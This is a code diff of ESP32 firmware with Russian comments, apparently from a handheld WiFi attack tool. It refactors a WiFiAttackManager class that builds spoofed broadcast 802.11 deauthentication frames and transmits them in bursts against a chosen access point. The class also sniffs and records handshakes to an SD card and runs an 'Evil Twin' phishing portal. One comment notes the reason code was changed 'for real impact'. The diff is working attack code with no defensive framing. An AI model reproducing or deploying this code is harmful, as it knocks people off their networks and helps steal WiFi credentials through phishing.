@@ -11,40 +11,44 @@ WiFiAttackManager::WiFiAttackManager() :
     _lastPacketTime(0), 
     _packetsSent(0), 
     _capturedHandshake(false),
-    _scanRetries(0) 
+    _scanRetries(0)
 {
     g_wifiManager = this; 
     memset(_packetBuffer, 0, 128);
 }
 
 void WiFiAttackManager::setup() { 
-    WiFi.mode(WIFI_STA); 
-    WiFi.disconnect(); 
+    // В v7.0 мы не включаем WiFi здесь. Это делает SystemController.
+    // Просто настраиваем конфиг.
     esp_wifi_set_ps(WIFI_PS_NONE); 
 }
 
 void WiFiAttackManager::stop() {
+    // 1. Останавливаем запись (важно сделать первым)
     SdManager::getInstance().stopCapture();
     
+    // 2. Останавливаем веб-портал
     if (WebPortalManager::getInstance().isRunning()) {
         WebPortalManager::getInstance().stop();
     }
     
+    // 3. Сбрасываем состояние
     _state = WiFiState::IDLE;
     _scanRetries = 0;
     
+    // 4. Отключаем сниффер
     esp_wifi_set_promiscuous_rx_cb(nullptr);
     esp_wifi_set_promiscuous(false);
-    WiFi.softAPdisconnect(true);
-    WiFi.mode(WIFI_STA);
     
-    // Safety Delay для радиомодуля
-    vTaskDelay(pdMS_TO_TICKS(150)); 
+    // ВАЖНО: Мы НЕ выключаем WiFi.mode(OFF) здесь.
+    // Это делает SystemController::stopCurrentTask().
 }
 
 void WiFiAttackManager::startScan() {
     if (_state != WiFiState::IDLE) return;
     _scanRetries = 0;
+    
+    // SystemController уже включил WiFi в режим STA
     WiFi.scanNetworks(true); 
     _state = WiFiState::SCANNING;
 }
@@ -53,10 +57,13 @@ void WiFiAttackManager::startDeauth(const TargetAP& target) {
     _currentTarget = target; 
     _packetsSent = 0; 
     _capturedHandshake = false;
+    
     SdManager::getInstance().startCapture();
+    
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_channel(_currentTarget.channel, WIFI_SECOND_CHAN_NONE);
     esp_wifi_set_promiscuous_rx_cb(&WiFiAttackManager::snifferHandler);
+    
     buildDeauthPacket();
     _state = WiFiState::ATTACKING_DEAUTH;
 }
@@ -75,34 +82,16 @@ void WiFiAttackManager::startEvilTwin(const TargetAP& target) {
 }
 
 void WiFiAttackManager::buildDeauthPacket() {
-    // Формируем 802.11 Deauthentication Frame
     memset(_packetBuffer, 0, 26);
-    
-    // Frame Control: Type=Management(00), Subtype=Deauth(1100) -> 0xC0
-    _packetBuffer[0] = 0xC0; 
-    _packetBuffer[1] = 0x00; 
-    
-    // Duration
-    _packetBuffer[2] = 0x3A; 
-    _packetBuffer[3] = 0x01; 
-    
-    // DA (Destination Address) - Broadcast (FF:FF:FF:FF:FF:FF)
+    _packetBuffer[0] = 0xC0; _packetBuffer[1] = 0x00; 
+    _packetBuffer[2] = 0x3A; _packetBuffer[3] = 0x01; 
     memset(&_packetBuffer[4], 0xFF, 6);               
-    
-    // SA (Source Address) - BSSID of Target AP
     memcpy(&_packetBuffer[10], _currentTarget.bssid, 6); 
-    
-    // BSSID - BSSID of Target AP
     memcpy(&_packetBuffer[16], _currentTarget.bssid, 6); 
+    _packetBuffer[22] = 0x00; _packetBuffer[23] = 0x00;
     
-    // Seq Number (0)
-    _packetBuffer[22] = 0x00; 
-    _packetBuffer[23] = 0x00;
-    
-    // Reason Code: 7 (Class 3 frame received from nonassociated STA)
-    // FIX v6.3: Was 0x00 (Reserved), changed to 0x07 for real impact
-    _packetBuffer[24] = 0x07; 
-    _packetBuffer[25] = 0x00; 
+    // FIX v6.3/v7.0: Reason Code 7 (Critical Fix)
+    _packetBuffer[24] = 0x07; _packetBuffer[25] = 0x00; 
 }
 
 void WiFiAttackManager::buildBeaconPacket(const char* ssid) {
@@ -135,10 +124,8 @@ bool WiFiAttackManager::loop(StatusMessage& statusOut) {
     statusOut.handshakeCaptured = _capturedHandshake;
 
     if (_state == WiFiState::ATTACKING_EVIL_TWIN) {
-        WebPortalManager::getInstance().processDns();
         statusOut.state = SystemState::ATTACKING_EVIL_TWIN;
         snprintf(statusOut.logMsg, MAX_LOG_MSG, "Phishing: %s", _currentTarget.ssid);
-        vTaskDelay(pdMS_TO_TICKS(5)); 
         return true; 
     }
 
@@ -149,18 +136,13 @@ bool WiFiAttackManager::loop(StatusMessage& statusOut) {
             _state = WiFiState::SCAN_COMPLETE; 
             snprintf(statusOut.logMsg, MAX_LOG_MSG, "Found: %d", n); 
         }
-        else if (n == -2) {
+        else if (n == -2) { // Still scanning or failed
             _scanRetries++;
-            if (_scanRetries > 3) {
-                _state = WiFiState::IDLE; 
-                snprintf(statusOut.logMsg, MAX_LOG_MSG, "Scan Failed!");
-                return false; 
-            } else {
+            if (_scanRetries > 200) { // Timeout safety (~2 sec)
+                // Если долго нет ответа, рестартим скан
                 WiFi.scanNetworks(true); 
-                snprintf(statusOut.logMsg, MAX_LOG_MSG, "Retry %d...", _scanRetries);
+                _scanRetries = 0;
             }
-        }
-        else {
             snprintf(statusOut.logMsg, MAX_LOG_MSG, "Scanning...");
         }
         return true;
@@ -174,7 +156,6 @@ bool WiFiAttackManager::loop(StatusMessage& statusOut) {
     if (_state == WiFiState::ATTACKING_DEAUTH) {
         statusOut.state = SystemState::ATTACKING_WIFI_DEAUTH; 
         if (now - _lastPacketTime > 10) {
-            // Шлем пакеты пачками по 3 шт для надежности
             for(int i=0; i<3; i++) { 
                 esp_wifi_80211_tx(WIFI_IF_STA, _packetBuffer, 26, false); 
                 _packetsSent++; 
